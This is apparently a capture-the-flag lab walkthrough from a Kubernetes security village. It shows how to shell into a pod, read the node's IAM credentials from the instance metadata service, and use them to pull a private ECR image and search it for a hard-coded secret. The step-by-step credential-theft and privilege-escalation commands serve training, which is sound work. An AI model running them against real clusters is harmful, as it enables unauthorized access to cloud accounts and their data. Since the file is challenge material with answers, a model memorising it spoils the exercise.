# Cascadia Cockpit Voice Recorders (CVR)

The *Cascadia Cockpit Voice Recorders (CVR)* challenge requires you to find a flag stored in a private [Elastic Container Registry (ECR) image](https://docs.aws.amazon.com/AmazonECR/latest/userguide/docker-pull-ecr-image.html){: target="_blank" rel="noopener"}. Unfortunately, the *kubeace-maverick* IAM user does not have permissions to pull images from the ECR repository. Without direct access to ECR, you will need to use the [AWS Instance Metadata Service IMDS](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html){: target="_blank" rel="noopener"} to escalate your AWS permissions and pull the private image from ECR.

## Pod Permission Inheritance

During the [Shadowhawk Challenge](./shadowhawk.md#pod-permission-inheritance){: target="_blank" rel="noopener"}, you learned that pods can escalate permissions by calling the node's instance metadata service (IMDS),  the permissions of the service account associated with the pod. In the *Cascadia Cockpit Voice Recorders (CVR)* challenge, you will need to use that privilege escalation technique again to access the private container image stored in the Elastic Container Registry (ECR).

1. Using your Terminal, verify that *kubeace-maverick* IAM user does not have access to describe the ECR repositories in the AWS account hosting the EKS cluster. What error message is returned?

    ??? tip "Hint"

        Run `aws ecr describe-repositories` command to list the ECR repositories in the AWS account.

        ```bash
        aws ecr describe-repositories
        ```

    ??? success "Answer"

        The describe repositories command will return an unauthorized error because the *kubeace-maverick* IAM user does not have access to the ECR repositories in the account.

        !!! abstract "Expected Output"
            ```
            An error occurred (AccessDeniedException) when calling the DescribeRepositories operation: User: arn:aws:iam::123456789012:user/kubeace-maverick-randomid is not authorized to perform: ecr:DescribeRepositories on resource: arn:aws:ecr:us-west-2:123456789012:repository/* because no identity-based policy allows the ecr:DescribeRepositories action
            ```

1. Use the [Instance Metadata API](https://microsoft.github.io/Threat-Matrix-for-Kubernetes/techniques/Instance%20Metadata%20API/){: target="_blank" rel="noopener"} attacker technique again to obtain temporary credentials from the node. Use the `kubectl exec` command to obtain a shell on the `ui` pod and exfiltrate credentials from the node's instance metadata service (IMDS). What is the name of the IAM role attached to the Kubernetes node? What IMDS endpoint can read temporary credentials for the IAM role?

    ??? tip "Hint"

        - List the pods running in the `hth` namespace. Make a note of the *ui* pod's name, as you will need this in the next step.

            ```bash
            kubectl get pods -n hth
            ```

            !!! abstract "Expected Output"
                ```bash
                NAME            READY   STATUS    RESTARTS   AGE
                api-randomid    1/1     Running   0          2d21h
                ui-randomid     1/1     Running   0          2d21h
                ```

        - Use the `kubectl exec` command to obtain a shell on the `ui` pod.

            ```bash
            kubectl exec --stdin --tty -n hth ENTER_UI_POD_NAME -- /bin/bash
            ```


            !!! abstract "Expected Output"
                ```bash
                root@ui-randomid:/#
                ```

        - Once inside the pod, query the IMDS endpoint (169.254.169.254) to view the list of IAM roles with security credentials on the node.

            ```bash
            curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ && echo;
            ```

        - Use the role's name to view the role's temporary security credentials. Make a note of the **AccessKeyId**, **SecretAccessKey**, and **Token** values for the next step.

            ```bash
            curl http://169.254.169.254/latest/meta-data/iam/security-credentials/?????/ && echo;
            ```

            !!! abstract "Expected Output"
                ```bash hl_lines="4-6"
                {
                  ...
                  "Type" : "AWS-HMAC",
                  "AccessKeyId" : "?????",
                  "SecretAccessKey" : "?????",
                  "Token" : "?????",
                  ...
                }
                ```

        - Run the following command to exit the shell and return to your local machine.

            ```bash
            exit
            ```

    ??? success "Answer"

        The AWS IAM Role attached to the Kubernetes node is **hth-node-role-randomid**. Which tells you that the command to obtain temporary credentials is...
            
        ```bash
        curl http://169.254.169.254/latest/meta-data/iam/security-credentials/hth-node-role-randomid/
        ```

## Private Registry Image Access

The [Private Registry Images](https://microsoft.github.io/Threat-Matrix-for-Kubernetes/techniques/images%20from%20a%20private%20registry/){: target="_blank" rel="noopener"} attacker technique uses credentials stored on the Kubernetes node to gain unauthorized access to container image repositories. [Image pull credentials](https://kubernetes.io/docs/tasks/configure-pod-container/pull-image-private-registry/){: target="_blank" rel="noopener"} can be used to access a private container repository, but the cloud provider's each have a their own recommended authentication process.

Use the node's temporary credentials to [pull the private image from the account's ECR repository](https://docs.aws.amazon.com/AmazonECR/latest/userguide/docker-pull-ecr-image.html){: target="_blank" rel="noopener"} exfiltrate the **Cascadia CVR** flag from ECR.

1. Open a new Terminal on your machine and set the required [AWS CLI environment variables](https://docs.aws.amazon.com/cli/v1/userguide/cli-configure-envvars.html){: target="_blank" rel="noopener"} to use the node's temporary credentials. What is the name of the ECR repository and URL that contains the `cascadia` flag.

    ??? tip "Hint"

        - Make sure you open a new Terminal session. Then, set each of the following environment variables to the configure the new Terminal session. Replace the `NODE_ROLE_ACCESS_KEY_ID`, `NODE_ROLE_SECRET_ACCESS_KEY`, and `NODE_ROLE_SESSION_TOKEN` placeholders with the values obtained from the previous step.

            ```bash
            export AWS_ACCESS_KEY_ID=ENTER_NODE_ROLE_ACCESS_KEY_ID
            export AWS_SECRET_ACCESS_KEY=ENTER_NODE_ROLE_SECRET_ACCESS_KEY
            export AWS_SESSION_TOKEN=ENTER_NODE_ROLE_SESSION_TOKEN
            export AWS_DEFAULT_REGION=us-west-2
            ```

        - Run the `aws sts get-caller-identity` command to verify you have properly configured the IAM role's temporary credentials. The output should show you are authenticating as the node's EC2 instance profile role.

            ```bash
            aws sts get-caller-identity
            ```

            !!! abstract "Expected Output"
                ```console
                {
                  "UserId": "AROASZY2ZSU65B7QQKFEP:i-0304eb3fda5d5c44d",
                  "Account": "123456789012",
                  "Arn": "arn:aws:sts::123456789012:assumed-role/hth-node-role-random-id/i-0304eb3fda5d5c44d"
                }
                ```

        - List all of the ECR repositories in the account. The output will show one container repository that contains the **cascadia** flag. Make a note of the **repositoryUri** value for the next step.

            ```bash
            aws ecr describe-repositories
            ```

            !!! abstract "Expected Output"
                ```console hl_lines="6-7"
                {
                  "repositories": [
                    {
                        "repositoryArn": "arn:aws:ecr:us-west-2:123456789012:repository/hth-api-randomid",
                        "registryId": "123456789012",
                        "repositoryName": "?????",
                        "repositoryUri": "?????",
                        "createdAt": "2024-11-13T18:58:33.370000-05:00",
                        "imageTagMutability": "MUTABLE",
                        "imageScanningConfiguration": {
                          "scanOnPush": false
                        },
                        "encryptionConfiguration": {
                          "encryptionType": "AES256"
                        }
                      }
                    ]
                }
                ```

    ??? success "Answer"

        The ECR repository that contains the `cascadia` flag is **hth-api-randomid**.

        !!! abstract "Expected Output"
            ```console
            "repositoryName": "hth-api-randomid",
            "repositoryUri": "123456789012.dkr.ecr.us-west-2.amazonaws.com/hth-api-randomid",
            ```

1. Use the `aws ecr list-images` command to enumerate the images in the ECR repository. What is the name of the image and tag that contains the **cascadia** flag?

    ??? tip "Hint"

        - Run the `aws ecr list-images` command to list the images in the ECR repository. Make a note of the **imageTag** value for the next step.

            ```bash
            aws ecr list-images --repository-name ?????
            ```

            !!! abstract "Expected Output"
                ```console hl_lines="4-5"
                {
                  "imageIds": [
                    {
                      "imageDigest": "sha256:?????",
                      "imageTag": "?????"
                    }
                  ]
                }
                ```

    ??? success "Answer"

        The list images command confirms an image with a *tag* value of **cascadia** exists in the **hth-api-randomid** ECR repository.

        !!! abstract "Expected Output"
            ```console
            "imageDigest": "sha256:?????",
            "imageTag": "cascadia"
            ```

1. Use the `aws ecr get-login-password` command to [authenticate to the ECR repository](https://docs.aws.amazon.com/AmazonECR/latest/userguide/registry_auth.html){: target="_blank" rel="noopener"}. Then, use the **repositoryUri** and **imageTag** values to pull the private image from the ECR repository. What is the size of the `cascadia` image?

    ??? tip "Hint"

        - Run the `aws ecr get-login-password` command to obtain an authentication token for the ECR repository and pass the token to the `docker login` command. You need to set the `accountid` and `region` placeholders with the values from the previous steps.

            ```bash
            aws ecr get-login-password | docker login --username AWS --password-stdin accountid.dkr.ecr.region.amazonaws.com
            ```

        - Use the `docker pull` command to pull the `cascadia` image from the ECR repository. You need to set the **repositoryUri** and **imageTag** placeholders with the values from the previous steps.

            ```bash
            docker pull repositoryUri:imageTag
            ```

        - Run the `docker images` command to verify the image was downloaded to your machine and see the image size.

    ??? success "Answer"

        The commands to sign into the ECR repository and pull the image are as follows. Remember, you will need to replace the AWS account id, region, and randomid placeholder values in your command.

        ```bash
        aws ecr get-login-password | docker login --username AWS --password-stdin accountid.dkr.ecr.region.amazonaws.com
        docker pull accountid.dkr.ecr.region.amazonaws.com/hth-api-randomid
        docker images | grep cascadia
        ```
        
        !!! abstract "Expected Output"
            ```console
            REPOSITORY                                      TAG       IMAGE ID       CREATED        SIZE
            123456789012.dkr.ecr.region.amazonaws.com/hth-api-randomid                  cascadia             5cdf199d2874   8 hours ago     131MB
            ```

1. Run the `docker save` command to save the `cascadia` image as a **tar** file on your machine. Extract the tar file and search the image layers for the `CASCADIA_CVR_KEY` flag.

    ??? tip "Hint"

        - Run the `docker save` command to save the `cascadia` image as a **tar** file on your machine. You need to set the **repositoryUri** and **imageTag** placeholders with the values from the previous steps.

            ```bash
            docker save repositoryUri:imageTag > /path/to/cascadia.tar
            ```

        - Extract the tar file and search the image layers for the `cascadia` flag.

            ```bash
            tar -xvf /path/to/cascadia.tar -C /path/to/directory
            cd /path/to/directory
            grep -r "CASCADIA"
            ```

        !!! abstract "Expected Output"
            ```console
            "CASCADIA_CVR_KEY=hth{?????}
            ```

## Conclusion

You have successfully completed the *Cascadia Cockpit Voice Recorders (CVR)* challenge. You used the [Instance Metadata API](https://microsoft.github.io/Threat-Matrix-for-Kubernetes/techniques/Instance%20Metadata%20API/){: target="_blank" rel="noopener"} to escalate your permissions and access the private ECR repository. You then used the credentials to gain access to the Cascadia private image, extract the image layers, and search for a hard-coded secret stored in an environment variable.

Congratulations! You have completed the Hackers Teaching Hackers 2024 Kubernetes Security Village.
